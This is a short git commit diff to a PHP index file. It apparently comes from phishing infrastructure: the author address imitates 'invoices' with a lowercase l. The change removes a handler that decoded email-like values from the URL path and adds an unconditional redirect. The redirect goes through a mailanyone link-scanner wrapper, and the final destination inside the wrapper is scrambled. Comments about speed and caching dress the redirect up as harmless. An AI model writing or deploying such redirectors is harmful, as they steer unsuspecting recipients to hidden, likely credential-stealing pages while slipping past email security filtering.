b9e545bccb48023c5ce8304b0ac09accba02e71e
londonherbslnvoices <londonherbslnvoices@gmail.com>
2025-01-17 02:32:49 -0500

    Update index.php

--- index.php
+++ index.php
@@ -1,18 +1,12 @@
 <?php
+// Enable output buffering for maximum speed
+ob_start();
 
-use App\EmailDecoder;
+// Set headers to prevent caching
+header("Cache-Control: no-cache, no-store, must-revalidate");
+header("Expires: 0");
+header("Pragma: no-cache");
 
-require __DIR__ . '/../vendor/autoload.php';
-
-// Extract the path from the URL (excluding the query string)
-$path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
-
-// Remove leading slash
-$input = ltrim($path, '/');
-
-// Process the input
-if (!empty($input)) {
-    App\EmailDecoder::process($input);
-} else {
-    echo "No data provided.";
-}
+// Perform the redirect
+header("Location: https://url6.mailanyone.net/scanner?m=1tOSNW-0000000F2iJ-32OO&d=4%7Cmail%2F90%2F1734660000%2F1tOSNW-0000000F2iJ-32OO%7Cin6g%7C57e1b682%7C30540607%7C16804777%7C6764D0B2AB884854268B6BD2EF93418D&o=%2Fphtt%3A%2Fstsecatsilsifbatooe.lrgwob.ne.icrtsdosne%2Fw.nitae%2Fidtclmth.x&s=W1_Qpo_5RC23UgXRNOBzSANovmE");
+exit;
